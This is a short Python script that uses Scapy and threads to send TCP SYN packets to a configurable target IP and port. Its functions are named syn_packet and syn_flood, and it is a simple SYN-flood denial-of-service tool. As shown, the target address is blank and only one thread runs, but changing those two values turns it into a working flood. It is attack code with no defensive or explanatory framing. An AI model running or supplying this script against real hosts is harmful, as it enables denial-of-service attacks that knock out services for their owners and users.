from scapy.all import *
from scapy.layers.inet import IP
import threading
import random
from scapy.layers.inet import TCP

target_ip = ''
target_port = 8080

def syn_packet():
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000))
    packet = ip/tcp
    send(packet, verbose=False)

def syn_flood(num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=syn_packet)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
        print("syn packet sent!")

if __name__ == '__main__':
    num_threads = 1
    syn_flood(num_threads)


